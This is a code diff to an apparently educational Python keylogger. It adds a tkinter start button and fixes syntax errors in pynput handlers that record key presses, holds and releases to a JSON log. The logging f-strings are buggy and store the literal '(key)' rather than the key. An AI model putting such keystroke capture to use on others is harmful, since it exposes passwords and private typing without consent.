@@ -1,5 +1,11 @@
+import tkinter as tk
+from tkinter import *
 from pynput import keyboard
 import json
+
+root= tk.Tk()
+root.geometry("150x200")
+root.title("Keylogger project")
 
 key_list= []
 x=False
@@ -18,19 +24,19 @@ def on_press(key):
     global x, key_list
     if x==False:
         key_list.append(
-            ('Pressed':f'(key)')
+            {'Pressed': f'(key)'}
         )
         x=True
     if x==True:
         key_list.append(
-            ('Held':f'(key)')
+            {'Held':f'(key)'}
         )
     update_json_file(key_list)
 
 def on_release(key):
     global x, key_list, key_strokes
     key_list.append(
-        ('Released':f'(key)')
+        {'Released':f'(key)'}
     )
     if x==True:
         x=False
@@ -42,13 +48,14 @@ def on_release(key):
 def butaction():
     print("[+] Running Keylogger successfully!\n[!] saving the logs in 'logs.json' ")
     with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
-    Listener.join()
+        Listener.join()
 
 
 empty=Label(root, text=" ").grid(row=0,column=0)
 empty=Label(root, text=" ").grid(row=1,column=0)
 empty=Label(root, text=" ").grid(row=2,column=0)
-empty=Label(root, text="Keylogger Project", font='Verdana 11 bold').grid(row=3,column=0)
+empty=Label(root, text="Keylogger Project", font='Verdana 11 bold').grid(row=3,column=2)
 empty=Label(root, text=" ").grid(row=4,column=0)
 empty=Label(root, text=" ").grid(row=5,column=0)
-Button(root, text="Start Keylogger", command-butaction).grid(row=6, column=2)
+Button(root, text="Start Keylogger", command=butaction).grid(row=6, column=2)
+root.mainloop()
